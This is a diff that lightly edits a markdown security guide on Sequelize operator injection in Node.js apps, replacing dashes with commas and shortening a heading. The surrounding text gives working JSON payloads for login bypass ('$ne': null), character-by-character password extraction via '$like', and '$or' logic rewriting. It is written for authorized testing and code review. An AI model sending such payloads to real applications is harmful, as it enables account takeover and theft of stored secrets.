@@ -1,6 +1,6 @@
 ---
 title: "Sequelize operator injection: attacker-supplied operators in where clauses"
-description: When request JSON is passed into a Sequelize where clause, attacker-controlled operator keys ($gt, $ne, $like) alter query logic—authentication bypass and data disclosure without raw SQL.
+description: When request JSON is passed into a Sequelize where clause, attacker-controlled operator keys ($gt, $ne, $like) alter query logic, authentication bypass and data disclosure without raw SQL.
 keywords:
   - Sequelize
   - operator injection
@@ -10,9 +10,9 @@ keywords:
   - NoSQL-style injection
 ---
 
-# Sequelize operator injection
+# Operator injection
 
-This is an injection into Sequelize's **query builder**, not into raw SQL. Sequelize expresses conditions with operators (`Op.gt`, `Op.ne`, `Op.like`, `Op.or`, …). When a request body or query string is parsed as JSON and passed straight into a `where` clause, an attacker can supply **operator objects** instead of plain scalars, rewriting the condition's logic—similar in spirit to NoSQL operator injection.
+This is an injection into Sequelize's **query builder**, not into raw SQL. Sequelize expresses conditions with operators (`Op.gt`, `Op.ne`, `Op.like`, `Op.or`, …). When a request body or query string is parsed as JSON and passed straight into a `where` clause, an attacker can supply **operator objects** instead of plain scalars, rewriting the condition's logic, similar in spirit to NoSQL operator injection.
 
 > **Scope.** For authorized penetration tests, CTF labs, and code review of systems you own or are contracted to assess.
 
@@ -23,11 +23,11 @@ This is an injection into Sequelize's **query builder**, not into raw SQL. Seque
 const user = await User.findOne({ where: req.body });
 ```
 
-If the attacker controls the JSON shape, each field value can become an operator object rather than a string. Older Sequelize versions accepted **string-keyed operators** (`$gt`, `$ne`) from JSON by default; this is why `Op.aliases` were deprecated and string operators disabled—but apps that re-enable aliases or hand-map JSON to `Op` symbols remain exposed.
+If the attacker controls the JSON shape, each field value can become an operator object rather than a string. Older Sequelize versions accepted **string-keyed operators** (`$gt`, `$ne`) from JSON by default; this is why `Op.aliases` were deprecated and string operators disabled, but apps that re-enable aliases or hand-map JSON to `Op` symbols remain exposed.
 
 ## Exploitation
 
-**Authentication / check bypass** — make a condition always true or skip the password match:
+**Authentication / check bypass**, make a condition always true or skip the password match:
 
 ```json
 { "username": "admin", "password": { "$ne": null } }
@@ -36,7 +36,7 @@ If the attacker controls the JSON shape, each field value can become an operator
 
 The `password <> NULL` / `password > ''` condition matches the stored row, so `findOne` returns the admin without knowing the password.
 
-**Boolean enumeration** — `$like`/`$startsWith` turn a lookup into an oracle:
+**Boolean enumeration**, `$like`/`$startsWith` turn a lookup into an oracle:
 
 ```json
 { "username": "admin", "password": { "$like": "a%" } }
@@ -44,7 +44,7 @@ The `password <> NULL` / `password > ''` condition matches the stored row, so `f
 
 Response differences leak the secret character by character.
 
-**Logic rewriting** — injecting `$or`/`$and` keys broadens the match set:
+**Logic rewriting**, injecting `$or`/`$and` keys broadens the match set:
 
 ```json
 { "$or": [ { "id": 1 }, { "is_admin": true } ] }
